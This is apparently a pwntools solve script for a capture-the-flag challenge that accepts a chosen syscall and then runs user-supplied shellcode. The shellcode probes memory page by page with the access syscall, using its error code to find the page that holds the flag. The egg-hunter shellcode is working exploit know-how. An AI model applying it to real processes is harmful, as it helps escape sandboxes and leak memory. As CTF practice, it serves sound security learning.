from pwn import *
from time import sleep

# p = remote('localhost', 1234)
p = process(argv=['IHNSAIMS', 'flag{test_flag}'])
print(p.recvuntil(b"pick a number!\n"))
p.sendline('21') # access syscall number
print(p.recvuntil(b"give me some shellcode to execute!\n"))

payload = asm("""
mov rcx, 0x04200000
push rcx
loop:
    mov rdi, [rsp]
    call syscall
    cmp rax, 0xfffffffffffffff2
    je increment
    int3 # if you reach this point you have a pointer to the flag page

increment:
    mov rax, 0x1000
    add [rsp], rax
    jmp loop
              
syscall: # rdi = filename ptr, rax and rsi clobbered
    mov rax, 0x15
    mov rsi, 0
    syscall
    ret
""", arch='x86_64')

#time.sleep(20) # just for debugging, gives time to attach gdb because pwntools gdb attach is weird
p.sendline(payload)
print(p.recvuntil(b"Good luck!\n"))

p.interactive()